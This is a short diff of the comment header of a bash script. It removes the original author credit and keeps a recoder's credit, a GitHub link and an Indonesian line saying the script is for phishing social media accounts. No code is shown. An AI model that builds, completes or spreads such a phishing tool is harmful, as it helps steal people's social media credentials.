@@ -1,6 +1,5 @@
 #!/bin/bash
 # N0tPh1Sh
-# Coded by: linux_choice
 # Recode By:NeonCls777
 # Github: https://github.com//N0tH1n6T0d0TeAm/N0tHp1Sh
 # Script ini Digunakan untuk Phising akun SocialMedia 
